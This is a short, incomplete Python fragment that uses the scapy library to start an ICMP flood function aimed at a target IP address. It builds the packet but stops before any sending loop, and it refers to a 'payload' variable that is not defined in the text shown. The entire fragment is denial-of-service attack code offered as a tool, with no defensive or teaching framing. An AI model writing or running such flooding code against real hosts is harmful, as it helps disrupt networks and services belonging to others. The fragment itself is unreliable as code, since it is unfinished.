from scapy.all import *

def icmpflood (targetip, timeout):
    packet = IP(dst=targetip) / ICMP() / payload